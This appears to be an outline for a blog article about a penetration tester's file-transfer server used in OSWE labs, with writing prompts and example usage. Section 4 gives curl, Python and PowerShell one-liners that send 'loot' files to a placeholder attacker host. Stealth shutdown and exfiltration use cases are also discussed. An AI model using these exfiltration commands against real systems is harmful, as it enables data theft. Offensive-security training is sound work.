# Writing Guide: FileTransferServer Article (OSWE-focused)

This document is a structured outline to help you write a technical article about your `FileTransferServer` class. It includes suggested section titles, talking points, code snippets, and usage examples. Each section includes questions or prompts to guide your writing.

---

## 1. Introduction

**Prompts:**
- What was missing in your workflow during OSWE labs that led you to write this tool?
- Why not use Python’s built-in `http.server` or a full web framework?

**Topics to touch on:**
- Utility of ad-hoc servers in exploit chains
- Need for reliable, modular, reusable components
- Design philosophy: clarity, single-responsibility, integration readiness

---

## 2. Goals of FileTransferServer

**Prompts:**
- What key problems does this solve that others don't?
- Which behaviors did you deliberately avoid (e.g., persistent state, CLI flags)?

**Points to highlight:**
- GET and POST support for files
- Base64 for blind or covert uploads
- Route randomization
- Self-shutdown logic for stealth
- Logging with `OffsecLogger`
- Callback hook for chaining behaviors (e.g., trigger next stage)

---

## 3. Class Overview and Key Parameters

**Prompt:**
- Which parameters are critical for first-time users to understand?

```python
fts = FileTransferServer(
    file_path="loot.zip",
    save_dir="/tmp",
    direction="upload",
    limit=1,
    encoded=True,
    log_to_console=True,
    html_page_route='/drop',
    on_transfer=lambda path, count: print(f"[callback] Received: {path}")
)
```

**Explain:**
- What happens on `.start()`
- When and how `on_transfer` is called
- The purpose of `limit` and how it interacts with shutdown

---

## 4. Use from the Victim Machine

### A. Uploading via curl
```bash
curl -X POST http://attacker:8888/<route> -F "file=@loot.txt"
```

### B. Uploading JSON base64
```python
import requests, base64
data = base64.b64encode(open("loot.txt", "rb").read()).decode()
requests.post("http://attacker:8888/<route>", json={"filename": "loot.txt", "data": data})
```

### C. Uploading from PowerShell
```powershell
$b64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("loot.zip"))
$json = @{ filename = "loot.zip"; data = $b64 } | ConvertTo-Json -Compress
Invoke-RestMethod -Uri "http://attacker:8888/<route>" -Method POST -Body $json -ContentType "application/json"
```

### D. GET Exfiltration
```python
requests.get("http://attacker:8888/exfil?q=<b64>&filename=data.txt")
```

---

## 5. Hidden Details Worth Noting

**Ideas:**
- Why use a Flask thread via `make_server()` instead of `app.run()`?
- Using `Path` consistently throughout
- Base64 decode fallback mechanism
- HTML template rendering from a string
- Using `request.remote_addr` for exfil file naming

---

## 6. Use Cases

**Discuss:**
- Payload hosting in deserialization or file include chains
- Temporary server for SSRF, XSS, or CLI injection drops
- Exfil point for local file reads or command output
- Low-profile transfer method in client demos

---

## 7. Closing Thoughts

**Ideas:**
- What could be added next (e.g., authentication, encryption, timers)?
- How has this helped you focus on PoC logic instead of tooling?
- Invite others to clone, adapt, and use in their labs

---

## Optional Sections

- Tips for wrapping this in a CLI or subprocess trigger
- Logging strategies (color/stage/timestamp)
- Upload validation and what you intentionally omitted

---
